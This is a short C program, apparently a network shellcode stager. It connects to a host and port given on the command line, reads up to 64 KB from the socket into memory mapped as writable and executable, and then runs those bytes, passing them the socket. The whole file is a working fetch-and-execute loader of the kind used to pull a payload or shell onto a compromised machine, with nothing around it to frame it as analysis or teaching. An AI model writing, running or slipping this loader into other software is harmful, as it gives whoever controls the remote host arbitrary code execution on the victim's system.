#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <netinet/in.h>

int connectTo(const char* hostname, const char* port){
    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family      = AF_UNSPEC;
    hints.ai_socktype    = SOCK_STREAM;
    hints.ai_protocol    = 0;
    hints.ai_flags       = AI_ADDRCONFIG;
    struct addrinfo* res = 0;
    int ret = getaddrinfo(hostname, port, &hints, &res);
    if(ret != 0){
        freeaddrinfo(res);
        return -1;
    }
    
    int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if(fd == -1) {
        freeaddrinfo(res);
        return -1;
    }

    if(connect(fd, res->ai_addr, res->ai_addrlen) == -1) {
        freeaddrinfo(res);
        return -1;
    }

    freeaddrinfo(res);
    return fd;
}

#define CHUNK_SIZE 65536

typedef void ExecutableChunk(int fd);

int main(int argc, char** argv){
    if(argc != 3){
        fprintf(stderr, "usage: %s <host> <port>\n", argv[0]);
        return -1;
    }

    ExecutableChunk *chunk =
        (ExecutableChunk*) mmap(NULL, CHUNK_SIZE,
                                PROT_READ | PROT_WRITE | PROT_EXEC,
                                MAP_PRIVATE | MAP_ANONYMOUS,
                                0, 0);
    if((void*) chunk == MAP_FAILED){
        fprintf(stderr, "Failed to map executable chunk: %s\n",
                strerror(errno));
        return 1;
    }

    fprintf(stderr, "Connecting to %s on port %s\n", argv[1], argv[2]);
    int fd = connectTo(argv[1], argv[2]);
    if(fd == -1){
        fprintf(stderr, "Connection failed.\n");
        return 1;
    }

    fprintf(stderr, "Connected. Reading data...\n");

    ssize_t bytes_read = 0;
    ssize_t recv_ret   = 0;
    while(1){
        recv_ret = recv(fd,
                        (void *)chunk + bytes_read,
                        CHUNK_SIZE - bytes_read,
                        0);
        if(recv_ret == -1){
            fprintf(stderr, "recv failed: %s\n",
                    strerror(errno));
            close(fd);
            munmap(chunk, CHUNK_SIZE);
            return 1;
        }
        if(recv_ret == 0) break;

        bytes_read += recv_ret;
        if(bytes_read >= CHUNK_SIZE) break;
    }
    
    fprintf(stderr, "Done. Executing code.\n");
    /* EXECUTE ARBITRARY CODE! */
    chunk(fd);

    fprintf(stderr, "The code exited.\n");
    close(fd);
    munmap(chunk, CHUNK_SIZE);

    return 0;
}
